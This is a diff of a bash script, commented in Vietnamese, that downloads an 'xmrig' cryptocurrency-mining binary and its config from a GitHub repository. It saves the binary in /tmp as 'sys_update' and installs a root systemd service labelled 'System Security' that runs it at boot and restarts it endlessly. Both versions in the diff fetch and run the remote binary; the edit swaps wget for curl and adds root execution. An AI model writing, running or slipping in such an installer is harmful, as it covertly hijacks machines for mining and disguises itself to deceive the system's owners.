@@ -1,20 +1,19 @@
 #!/bin/bash
 
-# Tự sửa lỗi xuống dòng nếu lỡ soạn thảo trên Windows
-# (Lệnh này sẽ dọn sạch ký tự \r trong chính script này)
-# tr -d '\r' < "$0" > /tmp/clean_setup.sh && bash /tmp/clean_setup.sh && exit
+# Chuyển vào thư mục tạm
+cd /tmp || exit
 
-cd /tmp
+# Tải và làm sạch file config.json ngay lập tức bằng lệnh 'tr'
+curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json | tr -d '\r' > config.json
 
-# Tải file và dùng 'tr' để lọc bỏ ký tự lạ ngay khi tải
-wget -q https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json -O - | tr -d '\r' > config.json
-wget -q https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -O sys_update
-
+# Tải file thực thi
+curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o sys_update
 chmod +x sys_update
 
-# Tạo service bằng cách viết trực tiếp, tránh lỗi Here-Doc
-printf "[Unit]\nDescription=System Security\nAfter=network.target\n\n[Service]\nExecStart=/tmp/sys_update --config=/tmp/config.json\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n" > /etc/systemd/system/sys_update.service
+# Tạo file service bằng printf để đảm bảo xuống dòng chuẩn LF
+printf "[Unit]\nDescription=System Security\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/tmp/sys_update --config=/tmp/config.json\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target\n" > /etc/systemd/system/sys_update.service
 
+# Kích hoạt hệ thống
 systemctl daemon-reload
 systemctl enable sys_update
 systemctl start sys_update
